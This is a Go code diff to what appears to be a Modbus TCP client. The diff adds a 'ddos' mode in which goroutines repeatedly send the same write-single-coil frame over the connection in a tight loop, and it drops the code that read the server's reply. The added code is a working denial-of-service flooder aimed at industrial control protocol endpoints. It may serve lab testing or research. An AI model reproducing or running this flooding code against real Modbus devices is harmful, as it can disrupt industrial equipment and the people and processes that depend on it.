@@ -1,13 +1,35 @@
 package main
 
 import (
-	"os"
 	"fmt"
 	"net"
-	"tcpserver/types"
-	"tcpserver/helper"
+	"os"
+	"runtime"
+	"sync"
 	"time"
+
+	"tcpserver/helper"
+	"tcpserver/types"
 )
+
+var NUM_GOROUTINES = 1
+
+var wg sync.WaitGroup
+
+func dos(buffer []byte, c net.Conn){
+	runtime.LockOSThread()
+	for {
+		//fmt.Fprintf(os.Stdout, "Printing!\n")
+		m, err := c.Write(buffer)
+		if err != nil {
+			fmt.Printf("%d Error %s\n", m, err.Error())
+			break
+		}
+		time.Sleep(1*time.Nanosecond)
+	}
+	runtime.UnlockOSThread()
+	wg.Done();
+}
 
 func client(args []string) {
 	if len(args) < 3{
@@ -35,7 +57,7 @@ func client(args []string) {
 	}
 	responsePDU := types.ModbusPDU {
 		FunctionCode: 5,
-		Data: []byte{0x40,0x00,0xFF,0x00},
+		Data: []byte{0x40,0x00,0x00,0x00},
 	}
 	responseADU := types.ModbusADU{MBAP: responseMBAP, PDU: responsePDU}
 	fmt.Printf("Sending: %s\n", responseADU.ToString())
@@ -45,28 +67,22 @@ func client(args []string) {
 		fmt.Fprintf(os.Stderr, "ToBinary Failed %v", err)
 	}
 	fmt.Printf("%v\n\n", helper.FormatByteSliceAsHexSliceString(responseBytes))
+
+	if args[3] == "ddos" {
+		wg.Add(NUM_GOROUTINES)
 	
-	c.Write(responseBytes)
-	
+		oldsetting := runtime.GOMAXPROCS(12)
+		fmt.Printf("OLD # of cores %d\n", oldsetting);
 
-	data := make([]byte, 260) // ModbusTCP frames have a cap of 260 bytes
-	size, err := c.Read(data)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "Error Recieving Data\n%v\n", err)
-		os.Exit(1)
-	}
-	if size <= 0 {
-		fmt.Fprintf(os.Stderr, "Recieved no Data\n%v\n", data)
-		os.Exit(1)
+		for i := 0; i < NUM_GOROUTINES; i++ {
+			go dos(responseBytes, c)
+			fmt.Printf("Started goroutine %d!!\n", i)
+		}
+
+		wg.Wait()
+	} else {
+		c.Write(responseBytes)
 	}
 
-	t := time.Now()	// prints time to console
-	time := t.Format(time.ANSIC)
-	fmt.Printf("Recieved at %s\n%s\n", time, helper.FormatByteSliceAsHexSliceString(data))
 
-	ADU, err := types.ParseModbusADU(data)	// sends data to function that returns decoded MODBUS frame
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "Error Parsing Data: %v\n", err)
-	}
-	fmt.Printf("%v\n", ADU.ToString())
 }
